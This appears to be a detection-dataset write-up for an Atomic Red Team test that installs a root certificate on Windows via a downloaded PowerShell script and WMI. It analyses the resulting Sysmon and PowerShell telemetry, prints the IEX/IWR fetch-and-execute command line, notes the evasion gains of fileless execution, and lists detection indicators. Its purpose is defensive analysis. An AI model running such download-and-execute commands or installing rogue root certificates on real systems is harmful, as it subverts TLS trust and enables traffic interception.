# T1553.004-7: Install Root Certificate — Add Root Certificate to CurrentUser Certificate Store

## Technique Context

T1553.004 (Subvert Trust Controls: Install Root Certificate) covers rogue CA certificate
installation. Test 7 uses a different approach from tests 5 and 6: it downloads and executes
a PowerShell script from GitHub (`RemoteCertTrust.ps1`) that installs a hard-coded certificate
blob directly into the Windows certificate store via WMI. This approach — IEX (IWR) combined
with a WMI certificate installation method — represents a more operationally sophisticated
technique. WMI-based certificate installation bypasses some detection mechanisms that focus
on `certutil.exe` or PowerShell certificate cmdlets, and the download-and-execute pattern
avoids leaving a script file on disk. The certificate being installed is a pre-encoded Microsoft
Root Certificate Authority 2010 blob used as a test payload.

## What This Dataset Contains

The dataset captures a complete, successful root certificate installation via downloaded
PowerShell using WMI, with network telemetry showing the GitHub download.

**Sysmon EID 1 (Process Create) records the IEX/IWR invocation**, tagged `T1059.001`:

```
"powershell.exe" & {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)}
```

**PowerShell EID 4104 captures the downloaded script content** — the full `RemoteCertTrust.ps1`
appears as a script block, including the hard-coded certificate thumbprint, base64-encoded
certificate blob, and the WMI certificate store manipulation code:

```
$CertThumbprint = '1F3D38F280635F275BE92B87CF83E40E40458400'
$EncodedCertBlob = 'BAAAAAEAAAA...' [truncated base64]
```

(Original from https://gist.github.com/mattifestation/429008d961bb719d5bd5ce262557bdbf)

**Sysmon EID 22 (DNS Query)** records resolution of both `github.com` and
`raw.githubusercontent.com`, confirming the network download took place.

**Sysmon EID 3 (Network Connection)** captures multiple outbound connections:
- PowerShell to `185.199.111.133` (raw.githubusercontent.com, port 443) — the script download
- Windows Defender (`MsMpEng.exe`) to `48.211.71.198` (port 443) — cloud-based verdict lookup
  triggered by the network download

**Sysmon EID 13 (Registry Value Set)** confirms the certificate was successfully installed:

```
TargetObject: HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\1F3D38F280635F275BE92B87CF83E40E40458400\Blob
Image: C:\Windows\system32\wbem\wmiprvse.exe
```

The certificate write is attributed to `wmiprvse.exe`, confirming the WMI installation path.

The dataset spans 44 Sysmon events, 12 Security events, and 66 PowerShell events over 8 seconds.
The timestamp gap between the process creation (~00:36:24) and the network/registry events
(~09:36:18 UTC) likely reflects a time zone representation difference in the Sysmon DNS/network
events versus the process events — both refer to the same execution.

## What This Dataset Does Not Contain (and Why)

**No WMI script content detail beyond the certificate blob.** The `RemoteCertTrust.ps1` script
is captured by EID 4104, but the inner WMI method call specifics (`SetStringValue` or similar)
are not separately logged as WMI activity events. No WMI EID 5857/5861 events appear.

**No Security EID 4624 logon events.** The test ran within an existing SYSTEM session.

**No file write for the downloaded script.** The `IEX (IWR ...)` pattern downloads and
executes in memory without writing to disk. There are no Sysmon EID 11 events for a `.ps1`
file — this is the intended evasion benefit of the fileless execution pattern.

Boilerplate EID 4104 script blocks dominate the 66 PowerShell events; the attack payload and
the downloaded script's certificate blob are the substantive entries.

## Assessment

This dataset is the most operationally complex of the four T1553.004 tests. It demonstrates the
combination of multiple evasion techniques: fileless execution via IEX/IWR, WMI-based certificate
installation (avoiding certutil and PowerShell certificate cmdlets), and a hardcoded certificate
blob (avoiding file artifacts). Despite this complexity, the Sysmon configuration captures the
full attack chain — DNS resolution, network connection, EID 13 registry write attributed to
`wmiprvse.exe`, and the full script content in script block logs. The network telemetry (EID 22
and EID 3) is particularly valuable for correlating the script download with the installation event.

## Detection Opportunities Present in This Data

- **EID 4104 script block**: `IEX (IWR ...)` fetching from GitHub (or any external URL) followed
  by certificate store operations is a high-fidelity indicator. The downloaded script's content,
  including `$EncodedCertBlob` and WMI store manipulation, is fully captured.
- **Sysmon EID 13**: Any write to `HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\`
  by `wmiprvse.exe` is anomalous. Legitimate root store modifications occur via `certutil.exe`,
  MMC snap-ins, or Windows Update — not `wmiprvse.exe`.
- **Sysmon EID 22 + EID 3**: DNS resolution of `github.com` or `raw.githubusercontent.com` by
  `powershell.exe` followed immediately by a network connection and then a certificate store
  write is a high-confidence kill-chain correlation.
- **Sysmon EID 1 command line**: The IEX/IWR GitHub URL is fully visible without script block
  logging; any PowerShell command line containing `IEX` combined with `IWR` or `Invoke-WebRequest`
  targeting remote sources warrants investigation.
- **EID 4688**: The command line is also captured in the Security log, providing a redundant
  detection path.
- **wmiprvse.exe writing to ROOT certificate store**: This is a direct and specific indicator
  that should alert in virtually any production environment.
